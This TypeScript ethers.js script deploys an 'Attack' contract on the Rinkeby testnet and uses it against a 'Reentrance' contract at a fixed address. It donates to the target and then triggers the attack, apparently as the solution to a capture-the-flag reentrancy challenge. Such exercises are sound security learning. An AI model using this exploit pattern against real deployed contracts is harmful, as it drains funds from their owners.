import { getDefaultProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';
import { readFileSync } from 'fs-extra';
import path from 'path/posix';

import { Attack__factory, Reentrance__factory } from '../types/ethers-contracts';

// const provider = getDefaultProvider("HTTP://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const testPrivKey = "";
const addr = "0x5b840a29aF650AA569D8C13Fef37f6C101188F13";

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);

  const factory = new Attack__factory(alice)
  factory.deploy(addr).then(async attack => {
    const victim = Reentrance__factory.connect(addr, provider).connect(alice)
    victim.donate(attack.address, {
      value: 1000000000000000,
      gasLimit: 1000000
    }).then(() => {
      attack.attack(1000000000000000).then(() => console.log("done"))
    })
  })
}

main().catch(e => {
  console.log("Error: " + e)
})
